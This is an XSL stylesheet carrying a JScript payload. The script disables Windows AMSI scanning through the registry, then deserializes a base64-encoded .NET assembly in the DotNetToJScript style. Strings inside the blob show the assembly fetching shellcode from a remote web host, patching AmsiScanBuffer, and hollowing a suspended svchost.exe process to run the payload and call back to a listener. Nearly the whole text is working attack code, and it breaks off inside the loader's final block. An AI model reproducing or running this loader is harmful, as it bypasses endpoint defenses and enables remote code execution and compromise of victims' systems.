<?xml version='1.0'?>
<stylesheet version="1.0"
    xmlns="http://www.w3.org/1999/XSL/Transform" 
    xmlns:ms="urn:schemas-microsoft-com:xslt" 
    xmlns:user="http://mycompany.com/mynamespace">

<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
        <![CDATA[
        var sh = new ActiveXObject('WScript.Shell');
        var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\Am"+"si"+"Enable";

        try{
            var SiamEnable = sh.RegRead(key);
            if(SiamEnable!=0){
            throw new Error(1, '');
            }
        }catch(e){
            sh.RegWrite(key, 0, "REG_DWORD"); // neuter SIAM
            sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1); // blocking call to Run()
            sh.RegWrite(key, 1, "REG_DWORD"); // put it back
            WScript.Quit(1);
        }

        function setversion() {
            new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
        }

        function debug(s) {}

        function base64ToStream(b) {
            var enc = new ActiveXObject("System.Text.ASCIIEncoding");
            var length = enc.GetByteCount_2(b);
            var ba = enc.GetBytes_4(b);
            var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
            ba = transform.TransformFinalBlock(ba, 0, length);
            var ms = new ActiveXObject("System.IO.MemoryStream");
            ms.Write(ba, 0, (length / 4) * 3);
            ms.Position = 0;
            return ms;
        }

        var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
        "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
        "dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
        "ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
        "AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
        "RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
        "eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
        "cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
        "aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
        "MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
        "dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
        "ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
        "B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
        "dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
        "CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
        "SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
        "cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
        "AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
        "AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
        "bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
        "NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
        "ZW1ibHkGFwAAAARMb2FkCg8MAAAAACIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
        "YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABkhgIAFulgYQAAAAAA"+
        "AAAA8AAiIAsCMAAAGgAAAAYAAAAAAAAAAAAAACAAAAAAAIABAAAAACAAAAACAAAEAAAAAAAAAAQA"+
        "AAAAAAAAAGAAAAACAAAAAAAAAwBAhQAAQAAAAAAAAEAAAAAAAAAAABAAAAAAAAAgAAAAAAAAAAAA"+
        "ABAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQOAAA"+
        "HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
        "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"+
        "BAAATQAEAA8ACgESALcEAABNAAgADwANARAApAQAAE0AGgAPABMBAAA1AAAATQAgAA8AVoDMAN0A"+
        "VoDdAOAAMwFjAOMABgBFBoUABgA7AYUABgAkAeAABgAbAeAABgAPAd0ABgBQAecABgDfBOcABgCo"+
        "AecABgAHAd0ABgALAd0ABgCoA90ABgCwA90ABgDtBd0ABgD7Bd0ABgCvAt0ABgDlBd0ABgBNB+oA"+
        "BgAdAOoABgApAIUABgAwB4UABgA6B4UABgAGBYUABgABAIUABgBzBoUABgArAIUABgBRAIUABgBb"+
        "AYUABgBDAYUAAAAAAIAAkSDZBO0AAQAAAAAAgACRIDcG8gACAAAAAACAAJEgTgYEAQwAAAAAAIAA"+
        "kSCKBxABEQAAAAAAgACWIJwHEAEWAAAAAACAAJEgLgEbARsAAAAAAIAAliDSBiABHAAAAAAAgACW"+
        "IH4HKQEgAAAAAACAAJYgfgYuASEASCAAAAAAhhgQBQYAIwBQIAAAAACGAO0DEAAjAAwhAAAAAIYA"+
        "zwQQACQAHCEAAAAAkQDyBEkAJQDAIwAAAACGAGgGEAAmAAAAAQBBBQAAAQDBAQAAAgDhAQAAAwDB"+
        "BQAABACuBQAABQCeBQAABgDVBQAABwAFBwAACACvBwEACQC1BAIACgB9BAAAAQBFBgAAAgAYBgAA"+
        "AwBtBAAABABDBAAABQBPBAAAAQBFBgAAAgCNBgIAAwDpBAAABADHAwIABQD1AAAAAQBFBgAAAgCN"+
        "BgAAAwDpBAAABADBAwIABQBWBAAAAQA7AQAAAQCbBgAAAgDHAwAAAwDhBgIABADDBgAAAQDTAQAA"+
        "AQCwAQAAAgC4AQAAAQCDAQAAAQCDAQAAAQCDAQAAAQDoAwkAEAUBABEAEAUGABkAEAUKACkAEAUQ"+
        "ADEAEAUQADkAEAUQAEEAEAUQAEkAEAUQAFEAEAUQAFkAEAUQAGEAEAUVAGkAEAUQAHEAEAUQAKEA"+
        "EAUGAHkAEAUGAIEARQcpAIEAswYuAIkAMAU1AKkAJQI5AKkAEwI/AJEAZQFEALkAHwIGAMkA7wFJ"+
        "ANkAWQduAPEAeQd2APkAzgN/AAEB1ASFABkBrAaIAAEBuAOPAAEB+QaTAAEB+QaYAAEB3wOdABkB"+
        "pQaiACEBWwCoABkBpQavACEBFAC2ACkB3wOdABkBrAa9ADEBEwfDAAkABADTAAgACADYAC4ACwA0"+
        "AS4AEwA9AS4AGwBcAS4AIwBlAS4AKwB6AS4AMwCkAS4AOwCkAS4AQwBlAS4ASwCqAS4AUwCkAS4A"+
        "WwCkAS4AYwDPAS4AawD5AUMAWwAGAmMAcwAMAgEAAwAAAAcAGgBOAAAEDQQLAAABAwDZBAEAQgEF"+
        "ADcGAQAAAwcATgYCAEABCQCKBwEAQAELAJwHAQBAAQ0ALgEBAAABDwDSBgMAAAERAH4HAwAAARMA"+
        "fgYDAEg5AAADAASAAAABAAAAAAAAAAAAAAAAAGkHAAACAAAAAAAAAAAAAADKABIBAAAAAAIAAAAA"+
        "AAAAAAAAAMoAKwQAAAAABAACAAUAAgAGAAIABwADAAAAAAAAUmVzZXJ2ZWQxAGtlcm5lbDMyAFRv"+
        "VUludDMyAGNiUmVzZXJ2ZWQyAGxwUmVzZXJ2ZWQyAF9fU3RhdGljQXJyYXlJbml0VHlwZVNpemU9"+
        "MwBSZXNlcnZlZDMAVG9JbnQ2NABEMzM0OTI4RTlENDE2MjlCNkQ3Q0E4Q0RCRjY0QjE4RDc5REZE"+
        "NEUzNjk4MERDMENBMDQ5NTM1MTg2NDQ3RjE3ADxNb2R1bGU+ADxQcml2YXRlSW1wbGVtZW50YXRp"+
        "b25EZXRhaWxzPgBDUkVBVEVfU1VTUEVOREVEAFBST0NFU1NCQVNJQ0lORk9STUFUSU9OAGxwTnVt"+
        "YmVyT2ZieXRlc1JXAGR3WABkd1kAY2IAbXNjb3JsaWIAVGhyZWFkSWQAUHJvY2Vzc0lkAFJlc3Vt"+
        "ZVRocmVhZABoVGhyZWFkAE1vcmVSZXNlcnZlZABscFJlc2VydmVkAFVuaXF1ZVBpZABnZXRfU3Rh"+
        "dHVzQ29kZQBIdHRwU3RhdHVzQ29kZQBzaGVsbGNvZGUAUnVudGltZUZpZWxkSGFuZGxlAENvbnNv"+
        "bGUAbHBUaXRsZQBoTW9kdWxlAHByb2NOYW1lAGxwQXBwbGljYXRpb25OYW1lAG5hbWUARGF0ZVRp"+
        "bWUAbHBDb21tYW5kTGluZQBXcml0ZUxpbmUAVmFsdWVUeXBlAEh0dHBXZWJSZXNwb25zZQBHZXRS"+
        "ZXNwb25zZQBDbG9zZQBDcmVhdGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJp"+
        "YnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRs"+
        "ZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBkd0ZpbGxBdHRyaWJ1dGUAQXNz"+
        "ZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUA"+
        "QXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmli"+
        "dXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBB"+
        "c3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAQnl0"+
        "ZQBkd1hTaXplAGR3WVNpemUAZ2V0X1NpemUAblNpemUAZHdTaXplAEZyb21CYXNlNjRTdHJpbmcA"+
        "VG9TdHJpbmcAcGF0aABDaGVja0NoZWNrAE1hcnNoYWwAa2VybmVsMzIuZGxsAG50ZGxsLmRsbABF"+
        "eGFtcGxlQXNzZW1ibHkuZGxsAFN5c3RlbQBCb29sZWFuAFRpbWVTcGFuAFByb2NJbmZvTGVuAHJl"+
        "dGxlbgBscE51bWJlck9mQnl0ZXNXcml0dGVuAHByb2NJbmZvcm1hdGlvbgBscFByb2Nlc3NJbmZv"+
        "cm1hdGlvbgBTeXN0ZW0uUmVmbGVjdGlvbgBQcm9jZXNzQmFzaWNJbmZvAGxwU3RhcnR1cEluZm8A"+
        "UHJvY2Vzc0luZm8AZ29nbwBaZXJvAFNsZWVwAGxwRGVza3RvcABscEJ1ZmZlcgBydW5uZXIAQml0"+
        "Q29udmVydGVyAGhTdGRFcnJvcgAuY3RvcgBJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAGdldF9U"+
        "b3RhbFNlY29uZHMAZHdNaWxsaXNlY29uZHMAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2Vz"+
        "AFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAYkluaGVyaXRI"+
        "YW5kbGVzAGxwVGhyZWFkQXR0cmlidXRlcwBscFByb2Nlc3NBdHRyaWJ1dGVzAGR3Q3JlYXRpb25G"+
        "bGFncwBkd0ZsYWdzAGR3WENvdW50Q2hhcnMAZHdZQ291bnRDaGFycwBSdW50aW1lSGVscGVycwBw"+
        "cm9jSW5mb3JtYXRpb25DbGFzcwBUZXN0Q2xhc3MAQ3JlYXRlUHJvY2VzcwBoUHJvY2VzcwBad1F1"+
        "ZXJ5SW5mb3JtYXRpb25Qcm9jZXNzAFJ1blByb2Nlc3MAUGViQWRkcmVzcwBHZXRQcm9jQWRkcmVz"+
        "cwBscEJhc2VBZGRyZXNzAGxwQWRkcmVzcwBDb25jYXQARm9ybWF0AFN1YnRyYWN0AE9iamVjdABs"+
        "cGZsT2xkUHJvdGVjdABWaXJ0dWFsUHJvdGVjdABmbE5ld1Byb3RlY3QAU3lzdGVtLk5ldABvcF9F"+
        "eHBsaWNpdABscEVudmlyb25tZW50AFN0YXJ0AENvbnZlcnQASHR0cFdlYlJlcXVlc3QAaFN0ZElu"+
        "cHV0AGhTdGRPdXRwdXQAZ2V0X05vdwB3U2hvd1dpbmRvdwBJbml0aWFsaXplQXJyYXkARXhhbXBs"+
        "ZUFzc2VtYmx5AENvcHkATG9hZExpYnJhcnkAUmVhZFByb2Nlc3NNZW1vcnkAV3JpdGVQcm9jZXNz"+
        "TWVtb3J5AGxwQ3VycmVudERpcmVjdG9yeQAAAAAvaAB0AHQAcAA6AC8ALwB3AG8AbAB0AHIAYQBt"+
        "AGEAcABsAGgAYQAuAGMAbwBtAAARYwBvAG4AZwByAGEAdABzAAARYQBtAHMAaQAuAGQAbABsAAAd"+
        "QQBtAHMAaQBTAGMAYQBuAEIAdQBmAGYAZQByAAA/YwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBz"+
        "AHQAZQBtADMAMgBcAHMAdgBjAGgAbwBzAHQALgBlAHgAZQAAgI1TAHQAYQByAHQAZQBkACAAJwBz"+
        "AHYAYwBoAG8AcwB0AC4AZQB4AGUAJwAgAGkAbgAgAGEAIABzAHUAcwBwAGUAbgBkAGUAZAAgAHMA"+
        "dABhAHQAZQAgAHcAaQB0AGgAIABQAEkARAAgAHsAMAB9AC4AIABTAHUAYwBjAGUAcwBzADoAIAB7"+
        "ADEAfQAuAAGAoUcAbwB0ACAAcAByAG8AYwBlAHMAcwAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAg"+
        "AGEAbgBkACAAbABvAGMAYQB0AGUAZAAgAFAARQBCACAAYQBkAGQAcgBlAHMAcwAgAG8AZgAgAHAA"+
        "cgBvAGMAZQBzAHMAIABhAHQAIAB7ADAAfQAuACAAUwB1AGMAYwBlAHMAcwA6ACAAewAxAH0ALgAA"+
        "BTAAeAAAA3gAAEVEAEUAQgBVAEcAOgAgAEUAeABlAGMAdQB0AGEAYgBsAGUAIABiAGEAcwBlACAA"+
        "YQBkAGQAcgBlAHMAcwA6ACAAMAB4AAADLgAANUQARQBCAFUARwA6ACAAZQBfAGwAZgBhAG4AZQB3"+
        "ACAAbwBmAGYAcwBlAHQAOgAgADAAeAAAK0QARQBCAFUARwA6ACAAUgBWAEEAIABvAGYAZgBzAGUA"+
        "dAA6ACAAMAB4AAApRABFAEIAVQBHADoAIABSAFYAQQAgAHYAYQBsAHUAZQA6ACAAMAB4AABLRwBv"+
        "AHQAIABlAHgAZQBjAHUAdABhAGIAbABlACAAZQBuAHQAcgB5AHAAbwBpAG4AdAAgAGEAZABkAHIA"+
        "ZQBzAHMAOgAgADAAeAAAYU8AdgBlAHIAdwByAG8AdABlACAAZQBuAHQAcgB5AHAAbwBpAG4AdAAg"+
        "AHcAaQB0AGgAIABwAGEAeQBsAG8AYQBkAC4AIABTAHUAYwBjAGUAcwBzADoAIAB7ADAAfQAuAABr"+
        "VAByAGkAZwBnAGUAcgBlAGQAIABwAGEAeQBsAG8AYQBkAC4AIABTAHUAYwBjAGUAcwBzADoAIAB7"+
        "ADAAfQAuACAAQwBoAGUAYwBrACAAeQBvAHUAcgAgAGwAaQBzAHQAZQBuAGUAcgAhAAAAk+uYkTpH"+
        "BEG0tLOEeltDgQAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECDgcIEUEOCAgRQRFFEkkIBAAAEUEG"+
        "IAERRRFBAyAADQUAARJVDgQgABJdBCAAEWEEAAEBDh8HFg4YCR0FHQURFBEQAhEYCQoYHQUdBRgC"+
        "GAkJCRgJBwACARJxEXUIAAQBHQUIGAgFAAEdBQ4CBhgGAAMODhwcAwAACAQAAQoYBAABGAoEIAEO"+
        "DgUAAg4ODgYAAgodBQgGAAMODg4OBgACCR0FCAUAAg4OHAYAARKAmQ4It3pcVhk04IkEBAAAAAQA"+
        "AAAAAgYJAgYIAwYRHAIGDgIGBgQAAQEJEQAKAg4OGBgCCRgOEBEUEBEQCwAFCBgIEBEYCRAJCgAF"+
        "AhgYHQUIEBgEAAEJGAgABAIYCQkQCQQAARgOBQACGBgOCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9u"+
        "RXhjZXB0aW9uVGhyb3dzAQgBAAIAAAAAABQBAA9FeGFtcGxlQXNzZW1ibHkAACkBACRFeGFtcGxl"+
        "IEFzc2VtYmx5IGZvciBEb3ROZXRUb0pTY3JpcHQAAAUBAAAAACQBAB9Db3B5cmlnaHQgwqkgSmFt"+
        "ZXMgRm9yc2hhdyAyMDE3AAApAQAkNTY1OThmMWMtNmQ4OC00OTk0LWEzOTItYWYzMzdhYmU1Nzc3"+
        "AAAMAQAHMS4wLjAuMAAABQEAAQAABAEAAAAAAAAAAAAAFulgYQAAAAACAAAAHAEAACw4AAAsGgAA"+
        "UlNEUztuXdgJicZGlPXvQFeW7ZsBAAAAXFwxOTIuMTY4LjEzNS43XHZpc3VhbHN0dWRpb1xEb3RO"+
        "ZXRUb0pTY3JpcHRcRXhhbXBsZUFzc2VtYmx5XG9ialx4NjRcUmVsZWFzZVxFeGFtcGxlQXNzZW1i"+
        "bHkucGRiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABI"+
        "McAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAw"+
        "AACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAALADAAAAAAAAAAAAALADNAAAAFYAUwBfAFYA"+
        "RQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAAAAAA"+
        "AAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQA"+
        "AABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAQQAwAAAQBTAHQAcgBpAG4AZwBGAGkAbABl"+
        "AEkAbgBmAG8AAADsAgAAAQAwADAAMAAwADAANABiADAAAABiACUAAQBDAG8AbQBtAGUAbgB0AHMA"+
        "AABFAHgAYQBtAHAAbABlACAAQQBzAHMAZQBtAGIAbAB5ACAAZgBvAHIAIABEAG8AdABOAGUAdABU"+
        "AG8ASgBTAGMAcgBpAHAAdAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAAAAAA"+
        "SAAQAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAEUAeABhAG0AcABsAGUAQQBz"+
        "AHMAZQBtAGIAbAB5AAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4AMAAuADAA"+
        "LgAwAAAASAAUAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABFAHgAYQBtAHAAbABlAEEAcwBz"+
        "AGUAbQBiAGwAeQAuAGQAbABsAAAAYgAfAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAA"+
        "QwBvAHAAeQByAGkAZwBoAHQAIACpACAASgBhAG0AZQBzACAARgBvAHIAcwBoAGEAdwAgADIAMAAx"+
        "ADcAAAAAACoAAQABAEwAZQBnAGEAbABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAAAAAAUAAUAAEA"+
        "TwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAEUAeABhAG0AcABsAGUAQQBzAHMAZQBt"+
        "AGIAbAB5AC4AZABsAGwAAABAABAAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEUAeABhAG0A"+
        "cABsAGUAQQBzAHMAZQBtAGIAbAB5AAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBu"+
        "AAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4A"+
        "AAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
        "AAAAAAAAAAAAAQ0AAAAEAAAACRcAAAAJBgAAAAkWAAAABhoAAAAnU3lzdGVtLlJlZmxlY3Rpb24u"+
        "QXNzZW1ibHkgTG9hZChCeXRlW10pCAAAAAoL";
        var entry_class = 'TestClass';

        try {
            setversion();
            var stm = base64ToStream(serialized_obj);
            var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
            var al = new ActiveXObject('System.Collections.ArrayList');
            var n = fmt.SurrogateSelector;
            var d = fmt.Deserialize_2(stm);
            al.Add(n);
            var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
